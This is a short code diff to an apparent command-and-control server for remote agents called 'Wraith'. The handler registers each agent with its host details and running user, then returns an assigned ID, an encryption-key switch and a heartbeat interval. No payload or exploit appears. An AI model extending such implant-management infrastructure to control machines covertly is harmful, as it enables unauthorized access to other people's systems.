@@ -88,9 +88,12 @@ class Handler_proto_v_0 {
                     $this->cData["wraithInfo"]["runningUser"],
                 ]);
 
+                // Generate and ID for the Wraith
+                $newWraithUniqueID = uniqid();
+
                 // Create a database entry for the Wraith
                 $this->dbm->dbAddWraith([
-                    "assignedID" => uniqid(),
+                    "assignedID" => $newWraithUniqueID,
                     "hostProperties" => json_encode($this->cData["hostInfo"]),
                     "wraithProperties" => json_encode($this->cData["wraithInfo"]),
                     "lastHeartbeatTime" => time(),
@@ -104,6 +107,13 @@ class Handler_proto_v_0 {
                 // Add an encryption key switch command to switch to a
                 // more secure, non-hard-coded encryption key
                 $this->response["switchKey"] = $this->dbm->dbGetSettings(["key" => ["wraithSwitchCryptKey"]])["wraithSwitchCryptKey"];
+
+                // Let the Wraith know what ID it was assigned so it can reference it in heartbeats
+                $this->response["assignedID"] = $newWraithUniqueID;
+
+                // Let the Wraith know how often to send heartbeats. This is the Wraith mark dead delay
+                // divided by 2.5 and rounded *down* to the nearest integer
+                $this->response["baseHeartbeatDelay"] = floor($this->dbm->dbGetSettings(["key" => ["wraithMarkOfflineDelay"]])["wraithMarkOfflineDelay"]/2.5);
 
                 // Respond
                 return;
